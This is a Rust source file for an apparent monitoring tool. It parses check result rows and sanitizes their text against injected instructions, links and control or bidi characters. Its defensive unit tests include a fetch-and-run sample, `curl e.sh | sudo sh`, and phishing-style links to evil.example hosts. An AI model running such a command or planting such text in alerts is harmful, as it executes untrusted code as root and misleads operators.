//! Result rows: what a `command` check's program prints and a `result-file` check's file holds.
//! `LEVEL<TAB>NAME<TAB>WHAT<TAB>NEXT` rows, then `RESULT<TAB>LEVEL`.
//!
//! The text is read whole or not at all: anything that isn't rows ending in one RESULT line that
//! agrees with them is a WARN about the text, worded for what's wrong with it. The `required` row
//! must be there, since a writer that renamed it would otherwise break the watch silently, and a
//! SKIP on it is a WARN too: a scheduled run never means to skip it.
//!
//! Each WARN or FAIL row is a problem, its WHAT and NEXT shown as written, worst first, then the
//! `required` row before the rest of its level, then the text's order. Worst first matters: what
//! came and went while alerts weren't getting through is named by the first problem.
//!
//! Who wrote the rows proves nothing about where their words came from: a script copies text from
//! whatever it checked, and that can be talked into anything. So a row is shown only if it keeps
//! the alert sentence rule: its WHAT one sentence, its NEXT starting as a command does, every
//! backtick closed, no control characters, line separators or bidi overrides, and not too long.
//! The rows that don't are counted and a few named, in one problem, and at most [`MAX_PROBLEMS`]
//! are shown, so a text full of rows can't make an alert no channel will take.
//!
//! The fingerprint is each bad row's level and name. A row's name is display text, so a writer
//! that renames a row makes it news once, as a new problem; that's the right trade, since a
//! changed name is a changed alert. A row that goes bad and recovers between two runs is never
//! seen at all, and one that recovers while another stays bad changes the fingerprint, so it's
//! told as the new set of problems, with no line saying it cleared.

use std::cmp::Reverse;
use std::collections::BTreeSet;
use std::sync::LazyLock;

use regex::Regex;

use crate::check::{Finding, Level};
use crate::sentence::{LEADS, Next, and_list, breaks, one_sentence, outside_code};

/// The longest row shown as written, WHAT and NEXT together.
const MAX_SHOWN: usize = 500;
/// The longest row name read, in bytes; a longer one makes its line one that isn't a row.
pub const MAX_NAME: usize = 64;
/// The most problems shown; the rest are counted in one more.
pub const MAX_PROBLEMS: usize = 10;
/// The most rows it can't show that are named; the rest are counted.
const MAX_NAMED: usize = 3;

/// Why the rows as a whole can't be believed. Each is a WARN, never OK: a check that stopped
/// working mustn't look healthy.
#[derive(Debug, PartialEq, Eq)]
pub enum Doubt {
    Unfinished,
    NotText,
    /// The line, counting from 1, that's neither a row nor a RESULT line.
    Malformed(usize),
    /// The line that names a row an earlier one already named.
    Duplicate(usize),
    PastResult,
    Disagrees {
        said: Level,
        rows: Level,
    },
    /// The `required` row it must have and doesn't.
    NoRequired(String),
}

impl Doubt {
    /// Its fingerprint, prefixed so it can't be taken for a row's.
    fn tag(&self) -> &'static str {
        match self {
            Doubt::Unfinished => "rows:unfinished",
            Doubt::NotText => "rows:not-text",
            Doubt::Malformed(_) => "rows:malformed",
            Doubt::Duplicate(_) => "rows:duplicate",
            Doubt::PastResult => "rows:past-result",
            Doubt::Disagrees { .. } => "rows:disagrees",
            Doubt::NoRequired(_) => "rows:no-required-row",
        }
    }

    fn what(&self, whose: &str) -> String {
        match self {
            Doubt::Unfinished => {
                format!(
                    "{whose} ends before its RESULT line, so whatever wrote it stopped partway."
                )
            }
            Doubt::NotText => format!("{whose} isn't text, so none of it can be read."),
            Doubt::Malformed(line) => {
                format!("{whose} has a line that isn't a row it can read, line {line}.")
            }
            Doubt::Duplicate(line) => {
                format!("{whose} names a row twice, the second time on line {line}.")
            }
            Doubt::PastResult => format!(
                "{whose} goes on past its RESULT line, so it may be two runs written together."
            ),
            Doubt::Disagrees { said, rows } => format!(
                "{whose} ends with RESULT {said} though its worst row is {rows}, so it can't be \
                 believed."
            ),
            Doubt::NoRequired(name) => format!(
                "{whose} has no {} row, which it must always have, so its writer has most likely \
                 renamed it and none of it can be believed.",
                row_name(name)
            ),
        }
    }
}

/// One row, borrowed from the text.
#[derive(Debug, PartialEq, Eq)]
pub(crate) struct Row<'a> {
    pub level: Level,
    /// A SKIP row, read as OK.
    pub skipped: bool,
    pub name: &'a str,
    pub what: &'a str,
    pub next: &'a str,
}

/// Characters a row's words mustn't hold, since a channel or a terminal would act on them or
/// hide them: control characters (C0, DEL and C1, U+0085 among them), line and paragraph
/// separators, and every format character, which takes in the bidi marks and overrides, the
/// zero-width ones, the soft hyphen, the byte-order mark and the tag characters.
static UNSAFE: LazyLock<Regex> = LazyLock::new(|| {
    Regex::new(r"[\p{Cc}\p{Cf}\p{Zl}\p{Zp}\x{E0000}-\x{E007F}]").expect("a valid pattern")
});

impl Row<'_> {
    /// Whether its words may be shown as written: the sentence rule, and no more than a channel
    /// can take.
    pub fn showable(&self) -> bool {
        let both = format!("{} {}", self.what, self.next);
        both.len() <= MAX_SHOWN
            && !UNSAFE.is_match(&both)
            && one_sentence(self.what)
            && self.what.ends_with('.')
            && LEADS.iter().any(|l| self.next.starts_with(l))
            && breaks(self.name, &both).is_empty()
            && !links(&outside_code(&both))
            && !links(self.name)
    }
}

/// Whether `text` holds a form every channel is sure to make a link of: `://`, `www.` or
/// `mailto:`, in any case. A bare domain isn't caught: refusing every dotted name would refuse
/// file and host names in honest rows.
fn links(text: &str) -> bool {
    let low = text.to_lowercase();
    ["://", "www.", "mailto:"].iter().any(|l| low.contains(l))
}

/// The rows of `text` and its worst level, checked against its RESULT line, with `required`'s
/// row there if it's set.
pub(crate) fn parse<'a>(
    text: &'a str,
    required: Option<&str>,
) -> Result<(Level, Vec<Row<'a>>), Doubt> {
    let mut rows = Vec::new();
    let mut names = BTreeSet::new();
    let mut result = None;
    for (i, line) in text.split_terminator('\n').enumerate() {
        let n = i + 1;
        if result.is_some() {
            return Err(Doubt::PastResult);
        }
        match line.split('\t').collect::<Vec<_>>().as_slice() {
            ["RESULT", level] => result = Some(level_of(level).ok_or(Doubt::Malformed(n))?),
            [level, name, what, next] if !name.is_empty() && name.len() <= MAX_NAME => {
                let (level, skipped) = match *level {
                    "SKIP" => (Level::Ok, true),
                    l => (level_of(l).ok_or(Doubt::Malformed(n))?, false),
                };
                if !names.insert(*name) {
                    return Err(Doubt::Duplicate(n));
                }
                rows.push(Row {
                    level,
                    skipped,
                    name,
                    what,
                    next,
                });
            }
            _ => return Err(Doubt::Malformed(n)),
        }
    }
    let said = result.ok_or(Doubt::Unfinished)?;
    let worst = rows.iter().map(|r| r.level).max().unwrap_or(Level::Ok);
    if worst != said {
        return Err(Doubt::Disagrees { said, rows: worst });
    }
    if let Some(u) = required.filter(|u| !names.contains(u)) {
        return Err(Doubt::NoRequired(u.to_string()));
    }
    Ok((worst, rows))
}

/// A row's name as a sentence may show it. Names are often words with spaces, like "replica
/// lag", so it's plainer than `shown`'s rule allows, but never one that could end a sentence or
/// quote a command; anything else is described.
fn row_name(name: &str) -> String {
    let plain = !name.is_empty()
        && !name.contains(". ")
        && !links(name)
        && name
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b" ._@:+-".contains(&b));
    if plain {
        name.to_string()
    } else {
        "a row with an unusual name".into()
    }
}

fn level_of(s: &str) -> Option<Level> {
    match s {
        "OK" => Some(Level::Ok),
        "WARN" => Some(Level::Warn),
        "FAIL" => Some(Level::Fail),
        _ => None,
    }
}

/// What a bad row comes to in the finding.
enum Said<'a> {
    Row(&'a Row<'a>),
    /// The `required` row, skipped.
    Skipped(&'a Row<'a>),
}

/// What `bytes` say, as a finding. `whose` starts each sentence about them ("The web server's
/// result for the nightly backup") and `see` is the command that shows them whole.
pub fn judge(bytes: &[u8], required: Option<&str>, whose: &str, see: &str) -> Finding {
    let doubt = |d: Doubt| {
        Finding::warn()
            .says(d.what(whose))
            .see(see)
            .fingerprint(d.tag())
    };
    let Ok(text) = std::str::from_utf8(bytes) else {
        return doubt(Doubt::NotText);
    };
    let (mut worst, rows) = match parse(text, required) {
        Ok(parsed) => parsed,
        Err(d) => return doubt(d),
    };
    let mut bad: Vec<(Level, Said)> = rows
        .iter()
        .filter_map(|r| {
            if r.skipped && Some(r.name) == required {
                Some((Level::Warn, Said::Skipped(r)))
            } else if r.level > Level::Ok {
                Some((r.level, Said::Row(r)))
            } else {
                None
            }
        })
        .collect();
    if bad.is_empty() {
        return Finding::ok();
    }
    worst = worst.max(Level::Warn);
    // A stable sort: within a level, the required row and then the text's order.
    bad.sort_by_key(|(level, said)| {
        let r = match said {
            Said::Row(r) | Said::Skipped(r) => r,
        };
        (Reverse(*level), Some(r.name) != required)
    });

    let unshown: Vec<&str> = bad
        .iter()
        .filter_map(|(_, s)| match s {
            Said::Row(r) if !r.showable() => Some(r.name),
            _ => None,
        })
        .collect();
    let mut f = if worst == Level::Fail {
        Finding::fail()
    } else {
        Finding::warn()
    };
    let (mut shown, mut more, mut said_unshown) = (0, 0, false);
    for (_, s) in &bad {
        match s {
            Said::Skipped(r) => {
                f = f
                    .says(format!(
                        "{whose} skipped its {} row, which a scheduled run never should, so most \
                         of it wasn't checked.",
                        row_name(r.name)
                    ))
                    .see(see);
                shown += 1;
            }
            Said::Row(r) if r.showable() => {
                if shown < MAX_PROBLEMS {
                    f = f.problem(r.what, Next::Written(r.next.to_string()));
                    shown += 1;
                } else {
                    more += 1;
                }
            }
            Said::Row(_) if !said_unshown => {
                said_unshown = true;
                f = f.says(unshown_sentence(whose, &unshown)).see(see);
                shown += 1;
            }
            Said::Row(_) => {}
        }
    }
    if more > 0 {
        f = f
            .says(format!(
                "{whose} has {more} more rows gone bad than an alert shows."
            ))
            .see(see);
    }
    let mut tags: Vec<String> = bad
        .iter()
        .map(|(level, s)| match s {
            Said::Row(r) => format!("{level}:{}", r.name),
            Said::Skipped(r) => format!("SKIP:{}", r.name),
        })
        .collect();
    tags.sort();
    // A tab, which a row's name can't hold.
    f.fingerprint(tags.join("\t"))
}

/// The one sentence for every row it can't show as written: how many, and a few of their names.
fn unshown_sentence(whose: &str, names: &[&str]) -> String {
    if let [one] = names {
        return format!(
            "{whose} has a row it can't show as written, {}.",
            row_name(one)
        );
    }
    let mut named: Vec<String> = names.iter().take(MAX_NAMED).map(|n| row_name(n)).collect();
    let rest = names.len() - named.len();
    if rest > 0 {
        named.push(format!("{rest} more"));
    }
    format!(
        "{whose} has {} rows it can't show as written, {}.",
        names.len(),
        and_list(&named)
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn row<'a>(level: Level, name: &'a str, what: &'a str, next: &'a str) -> Row<'a> {
        Row {
            level,
            skipped: false,
            name,
            what,
            next,
        }
    }

    #[test]
    fn rows_and_their_worst_level_are_read_and_skip_is_ok() {
        let text = "OK\tssh\treached\t\nSKIP\tos\tnot judged\t\n\
                    WARN\tdisk\tThe disk is full.\tSee `df`.\nRESULT\tWARN\n";
        let skipped = Row {
            skipped: true,
            ..row(Level::Ok, "os", "not judged", "")
        };
        assert_eq!(
            parse(text, Some("ssh")),
            Ok((
                Level::Warn,
                vec![
                    row(Level::Ok, "ssh", "reached", ""),
                    skipped,
                    row(Level::Warn, "disk", "The disk is full.", "See `df`."),
                ]
            ))
        );
    }

    #[test]
    fn text_it_cant_read_whole_is_a_doubt_that_says_why_never_rows() {
        for (text, doubt) in [
            ("", Doubt::Unfinished),
            ("OK\tssh\treached\t\n", Doubt::Unfinished),
            ("RESULT\tOK\nOK\tssh\treached\t\n", Doubt::PastResult),
            ("RESULT\tOK\nRESULT\tOK\n", Doubt::PastResult),
            ("RESULT\tOK\n\n", Doubt::PastResult), // a trailing blank line
            ("OK\tssh\treached\t\nRESULT\tMAYBE\n", Doubt::Malformed(2)),
            ("OK\t\treached\t\nRESULT\tOK\n", Doubt::Malformed(1)), // an empty name
            ("OK\tssh\n", Doubt::Malformed(1)),
            ("MAYBE\tssh\treached\t\nRESULT\tOK\n", Doubt::Malformed(1)),
            (
                "OK\tssh\treached\t\textra\nRESULT\tOK\n",
                Doubt::Malformed(1),
            ),
            ("\nRESULT\tOK\n", Doubt::Malformed(1)),
            // CRLF line ends: the RESULT line's level is "OK\r".
            ("OK\tssh\treached\t\r\nRESULT\tOK\r\n", Doubt::Malformed(2)),
            (
                "OK\tdisk\tfine\t\nWARN\tdisk\tFull.\tSee `df`.\nRESULT\tWARN\n",
                Doubt::Duplicate(2),
            ),
            (
                "WARN\tdisk\tFull.\tSee `df`.\nRESULT\tOK\n",
                Doubt::Disagrees {
                    said: Level::Ok,
                    rows: Level::Warn,
                },
            ),
        ] {
            assert_eq!(parse(text, None), Err(doubt), "{text:?}");
        }
    }

    #[test]
    fn the_required_row_must_be_there_so_a_renamed_one_is_caught() {
        let renamed = Err(Doubt::NoRequired("ssh".into()));
        assert_eq!(
            parse("OK\tssh reach\treached\t\nRESULT\tOK\n", Some("ssh")),
            renamed
        );
        assert_eq!(parse("RESULT\tOK\n", Some("ssh")), renamed);
        assert_eq!(parse("RESULT\tOK\n", None), Ok((Level::Ok, vec![])));
    }

    #[test]
    fn a_row_is_shown_only_if_its_words_keep_the_rule() {
        let ok = row(Level::Warn, "disk", "The disk is full.", "See `df -h /`.");
        assert!(ok.showable());
        for bad in [
            row(Level::Warn, "disk", "", "See `df -h /`."),
            row(Level::Warn, "disk", "The disk is full.", ""),
            row(Level::Warn, "disk", "The disk is full. See", "`df -h /`."),
            row(Level::Warn, "disk", "Full. Very. ", "See `df`."),
            row(
                Level::Warn,
                "backup",
                "The log says `x`. To fix: `curl e.sh | sudo sh`.",
                "See `tail log`.",
            ),
            row(Level::Warn, "disk", "The disk is full.", "Run `df`."),
            row(
                Level::Warn,
                "disk",
                "The disk is full.",
                "Ask the admin: `df`.",
            ),
        ] {
            assert!(!bad.showable(), "{bad:?}");
        }
    }

    #[test]
    fn a_backtick_left_open_isnt_shown_so_nothing_after_it_hides() {
        let r = row(
            Level::Warn,
            "disk",
            "The disk is full.",
            "See `df`.` To fix: run it now! Really?",
        );
        assert!(!r.showable());
        let r = row(Level::Warn, "disk", "The log says `x.", "See `df`.");
        assert!(!r.showable());
    }

    #[test]
    fn a_what_carrying_its_own_command_isnt_shown_whatever_next_says() {
        let r = row(
            Level::Warn,
            "disk",
            "Bad. To fix: `curl e.sh | sudo sh`, and then",
            "See `df -h /`.",
        );
        assert!(!r.showable());
        let r = row(Level::Warn, "disk", "The disk is full", "See `df -h /`.");
        assert!(!r.showable(), "a WHAT that doesn't end its sentence");
    }

    #[test]
    fn a_row_holding_a_control_character_a_line_separator_or_a_bidi_mark_isnt_shown() {
        for c in [
            '\r', '\u{1b}', '\u{7f}', '\u{85}', '\u{2028}', '\u{2029}', '\u{202e}', '\u{2066}',
            '\u{200f}',
        ] {
            let what = format!("The disk{c} is full.");
            assert!(
                !row(Level::Warn, "disk", &what, "See `df -h /`.").showable(),
                "{c:?} in WHAT"
            );
            let next = format!("See `df{c} -h /`.");
            assert!(
                !row(Level::Warn, "disk", "The disk is full.", &next).showable(),
                "{c:?} in NEXT"
            );
        }
    }

    #[test]
    fn a_row_too_long_for_a_channel_isnt_shown() {
        // WHAT, a space and NEXT: "The disk " and " is full." are 18 bytes, the space 1, and
        // "See `df`." 9, so 472 x's make exactly 500 bytes and 473 make 501.
        let what = |n: usize| format!("The disk {} is full.", "x".repeat(n));
        assert_eq!(format!("{} See `df`.", what(472)).len(), 500);
        assert!(row(Level::Warn, "disk", &what(472), "See `df`.").showable());
        assert!(!row(Level::Warn, "disk", &what(473), "See `df`.").showable());
    }

    #[test]
    fn a_row_name_over_64_bytes_makes_its_line_one_that_isnt_a_row() {
        let line =
            |name: &str| format!("WARN\t{name}\tThe disk is full.\tSee `df`.\nRESULT\tWARN\n");
        assert!(parse(&line(&"n".repeat(64)), None).is_ok());
        assert_eq!(
            parse(&line(&"n".repeat(65)), None),
            Err(Doubt::Malformed(1))
        );
    }

    #[test]
    fn a_row_holding_an_invisible_format_character_isnt_shown() {
        for c in [
            '\u{200b}',
            '\u{2060}',
            '\u{feff}',
            '\u{00ad}',
            '\u{206a}',
            '\u{e0041}',
        ] {
            let what = format!("The disk{c} is full.");
            assert!(
                !row(Level::Warn, "disk", &what, "See `df -h /`.").showable(),
                "{c:?} in WHAT"
            );
            let next = format!("See `df{c} -h /`.");
            assert!(
                !row(Level::Warn, "disk", "The disk is full.", &next).showable(),
                "{c:?} in a code span"
            );
        }
    }

    #[test]
    fn www_and_mailto_forms_arent_shown_in_words_or_a_name() {
        for what in [
            "Go to www.evil.com to fix it.",
            "Go to WWW.Evil.com to fix it.",
            "Write to mailto:help@evil.example to fix it.",
            "Open MAILTO:help@evil.example now.",
        ] {
            assert!(
                !row(Level::Warn, "login", what, "See `df`.").showable(),
                "{what}"
            );
        }
        let named = row(Level::Warn, "www.evil.com", "The login broke.", "See `df`.");
        assert!(!named.showable());
        assert_eq!(row_name("www.evil.com"), "a row with an unusual name");
        assert_eq!(
            row_name("http://evil.example"),
            "a row with an unusual name"
        );
        // A bare domain isn't refused: it can't be told from a host name in an honest row.
        let bare = row(
            Level::Warn,
            "host",
            "The host db.example.com is down.",
            "See `df`.",
        );
        assert!(bare.showable());
    }

    #[test]
    fn a_url_outside_a_code_span_isnt_shown_and_inside_one_is() {
        let link = row(
            Level::Warn,
            "login",
            "Sign in at https://evil.example/login to fix it.",
            "See `df`.",
        );
        assert!(!link.showable());
        let link = row(
            Level::Warn,
            "login",
            "The status page is down.",
            "See http://status.example/.",
        );
        assert!(!link.showable());
        let code = row(
            Level::Warn,
            "status",
            "The status page is down.",
            "See `curl -sI https://status.example/`.",
        );
        assert!(code.showable());
    }

    #[test]
    fn the_rows_it_cant_show_are_counted_and_a_few_named() {
        let w = "Its result";
        assert_eq!(
            unshown_sentence(w, &["disk"]),
            "Its result has a row it can't show as written, disk."
        );
        assert_eq!(
            unshown_sentence(w, &["a", "b"]),
            "Its result has 2 rows it can't show as written, a and b."
        );
        assert_eq!(
            unshown_sentence(w, &["a", "b. X", "c", "d", "e"]),
            "Its result has 5 rows it can't show as written, a, a row with an unusual name, c \
             and 2 more."
        );
    }

    #[test]
    fn text_that_isnt_utf8_is_one_doubt() {
        let f = judge(b"OK\t\xff\tx\t\nRESULT\tOK\n", None, "Its result", "cat r");
        assert_eq!(
            f,
            Finding::warn()
                .says("Its result isn't text, so none of it can be read.")
                .see("cat r")
                .fingerprint("rows:not-text")
        );
    }
}
